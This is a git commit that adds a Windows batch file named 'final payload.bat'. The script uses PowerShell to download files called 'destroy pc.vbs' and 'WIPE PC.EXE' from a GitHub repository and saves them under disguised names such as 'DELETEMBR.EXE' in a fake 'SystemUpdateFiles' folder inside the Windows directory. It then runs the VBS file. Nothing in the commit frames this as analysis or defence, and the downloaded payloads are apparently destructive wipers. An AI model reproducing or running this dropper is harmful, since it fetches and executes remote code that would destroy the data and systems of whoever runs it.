897ba7b255a1a09645aaf778296129b819393677
littleman190 <85857986+littleman190@users.noreply.github.com>
2023-08-21 21:19:41 -0700

    Add files via upload

---
+++ final payload.bat
@@ -0,0 +1,15 @@
+@echo off
+powershell -c Invoke-WebRequest -URI https://github.com/littleman190/rthggrdntfhjndfhgrtfdhghbeamdeezsdffhnfdufgtfs/blob/main/destroy%20pc.vbs -OutFile c:\windows\SystemUpdateFiles\lastpayloadvbs.vbs
+c:
+cd..
+cd..
+cd..
+cd..
+cd..
+cd..
+cd..
+cd..
+cd windows
+cd SystemUpdateFiles
+powershell -c Invoke-WebRequest -URI https://github.com/littleman190/rthggrdntfhjndfhgrtfdhghbeamdeezsdffhnfdufgtfs/blob/main/WIPE%20PC.EXE -OutFile c:\windows\SystemUpdateFiles\DELETEMBR.EXE
+start lastpayloadvbs.vbs
